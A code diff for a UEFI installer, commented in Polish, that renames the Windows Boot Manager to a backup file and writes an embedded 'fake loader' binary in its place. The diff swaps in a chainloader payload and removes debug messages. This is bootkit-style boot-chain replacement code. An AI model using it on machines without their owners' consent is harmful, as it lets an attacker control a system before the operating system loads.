@@ -4,8 +4,8 @@
 CHAR16 *OriginalLoader = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
 CHAR16 *BackupLoader   = L"\\EFI\\Microsoft\\Boot\\bootmgfw_ms.efi";
 
-extern unsigned char UEFIprobe_efi[];
-extern unsigned int UEFIprobe_efi_len;
+extern unsigned char chainloader_efi[];
+extern unsigned int chainloader_efi_len;
 
 int mainInstall() {
     //finding partition with windows
@@ -21,10 +21,9 @@ int mainInstall() {
     printf("Zmiana nazwy udana\n");
 
     //creating fake loader
-    UINTN realSize = (UINTN)UEFIprobe_efi_len;
-    printf("ZAPISUJE: %02x %02x %02x %02x\n", UEFIprobe_efi[0], UEFIprobe_efi[1], UEFIprobe_efi[2], UEFIprobe_efi[3]);
+    UINTN realSize = (UINTN)chainloader_efi_len;
     BS->Stall(5000000);
-    status = writeFileToRoot(root, OriginalLoader, UEFIprobe_efi, realSize);
+    status = writeFileToRoot(root, OriginalLoader, chainloader_efi, realSize);
 
     root->Close(root);
 
@@ -48,7 +47,6 @@ EFI_HANDLE findPartition(CHAR16 *fileName) {
         if (!root) continue;
         EFI_FILE_PROTOCOL *target = openFile(root,fileName, EFI_FILE_MODE_READ);
         if(target) {
-            printf("znaleziono windowsa\n");
             target->Close(target);
 
             EFI_HANDLE result_handle = handle_buffer[i];
@@ -99,7 +97,6 @@ EFI_FILE_PROTOCOL* openFile(EFI_FILE_PROTOCOL *root, CHAR16 *path, UINT64 mode) 
         0
     );
     if(status == EFI_SUCCESS){
-        printf("Znaleziono plik\n");
         return target_file;
     } 
     return NULL;
